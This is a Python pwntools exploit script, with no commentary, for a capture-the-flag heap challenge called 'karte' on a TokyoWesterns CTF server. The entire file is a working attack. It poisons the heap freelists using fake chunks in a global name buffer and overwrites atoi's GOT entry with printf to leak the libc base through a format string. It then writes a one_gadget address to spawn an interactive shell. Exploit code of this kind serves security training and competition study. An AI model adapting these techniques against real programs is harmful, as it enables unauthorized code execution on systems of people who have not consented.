#!/usr/bin/env python
from pwn import *

def add(size, description='A'):
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(size))
    s.sendafter('> ', description)
    s.recvuntil('Added id ')
    return int(s.recvline(False))

def delete(id_):
    s.sendlineafter('> ', '3')
    s.sendlineafter('> ', str(id_))

def modify(id_, description):
    s.sendlineafter('> ', '4')
    s.sendlineafter('> ', str(id_))
    s.sendafter('> ', description)

def rename(name):
    s.sendlineafter('> ', '99')
    s.sendafter('... ', name)

if len(sys.argv) == 1:
    s = process('./karte-2a6f1c5c778037eba5d86ad3e20cc387a307643a785059669dd2ce1d999a2268')
else:
    s = remote('karte.chal.ctf.westerns.tokyo', 10001)

elf = ELF('./karte-2a6f1c5c778037eba5d86ad3e20cc387a307643a785059669dd2ce1d999a2268')
libc = ELF('./libc-2-cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d.27.so')

name = ''
name += p64(0) + p64(0x71)
name += p64(elf.symbols['name'] + 0x30)

s.sendafter('... ', name)

for i in range(7):
    delete(add(0x68))
x = add(0x68)
delete(add(0x68))
delete(x)
modify(x, p64(elf.symbols['name'])[:4])
x = add(0x68)
y = add(0x68, p64(0) * 0x5 + p64(0x71))
z = add(0x68, (p64(0) + p64(0x21)) * 6)
rename(p64(0) + p64(0x71) + p64(0) * 5 + '\x21')
delete(z)
delete(x)
delete(y)

rename(p64(0) + p64(0x71) + p64(0x602075))
x = add(0x68)
add(0x68, '\0' * 0x63 + '\x71')

rename(p64(0) + p64(0x71))
delete(x)
rename(p64(0) + p64(0x71) + p64(0x6020e0))

x = add(0x68)
add(0x68, (p64(0) + p64(0x71)) * 3 + p32(0) + p32(4) + p64(0) * 3 + p32(1) + p32(x) + p64(elf.symbols['name'] + 0x10))
delete(x)

rename(p64(0) + p64(0x71) + p64(0x602100))
x = add(0x68)
payload = ''
payload += p64(0) * 2
payload += p32(0) + p32(4) + p64(0) * 3
payload += p32(1) + p32(1) + p64(elf.got['puts'])
payload += p64(0) * 2
payload += p32(1) + p32(0xdeadbeef) + p64(elf.got['atoi'])
payload += p64(0xdeadc0bebeef)
add(0x68, payload[:-1])

modify(0xdeadbeef, p64(elf.plt['printf'])[:6])

s.sendlineafter('> ', '%19$p')
libc_base = int(s.recvuntil('W')[:-1], 0x10) - 0x21b97
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

s.sendlineafter('> ', 'A' * 4)
s.sendlineafter('> ', 'A')
s.sendafter('> ', p64(libc_base + one_gadgets[2])[:6])
s.recvuntil('1\n')

s.interactive()
